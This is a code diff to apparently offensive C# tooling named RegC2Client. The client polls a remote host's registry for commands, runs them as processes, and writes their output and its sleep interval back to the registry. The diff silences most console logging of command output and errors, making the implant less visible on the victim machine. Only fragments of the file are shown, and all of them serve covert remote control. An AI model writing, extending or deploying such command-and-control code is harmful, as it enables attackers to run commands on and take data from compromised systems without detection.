@@ -46,7 +46,7 @@ namespace RegC2Client
             p.StartInfo.Arguments = argument;
             p.Start();
             string res = p.StandardOutput.ReadToEnd();
-            Console.WriteLine(res);
+            //Console.WriteLine(res);
             return res;
         }
 
@@ -61,7 +61,7 @@ namespace RegC2Client
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
+                //Console.WriteLine(ex.Message);
                 return false;
             }
             try
@@ -69,11 +69,11 @@ namespace RegC2Client
                 myReg.SetValue("output", output);
             } catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
+                //Console.WriteLine(ex.Message);
                 return false;
             }
 
-            Console.WriteLine("Output updated successfully");
+            //Console.WriteLine("Output updated successfully");
             myReg.Close();
 
             return true;
@@ -91,13 +91,13 @@ namespace RegC2Client
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
-                Console.WriteLine("Failed to find new sleeptime... keeping it at 30");
+                //Console.WriteLine(ex.Message);
+                //Console.WriteLine("Failed to find new sleeptime... keeping it at 30");
                 return sleepTime;
             }
 
             sleepTime = Int32.Parse(myReg.GetValue("sleep").ToString());
-            Console.WriteLine("Sleep time is:  {0}  ", sleepTime);
+            //Console.WriteLine("Sleep time is:  {0}  ", sleepTime);
             myReg.Close();
 
             return sleepTime;
@@ -150,7 +150,7 @@ namespace RegC2Client
                     string command = GetCommand(host, registrykey);
                     if (command == "Exit")
                     {
-                        Console.WriteLine("Shutting down");
+                        Console.WriteLine("Shutting down...");
                         return;
                     }
                     string lastOutput = GetOutput(host, registrykey);
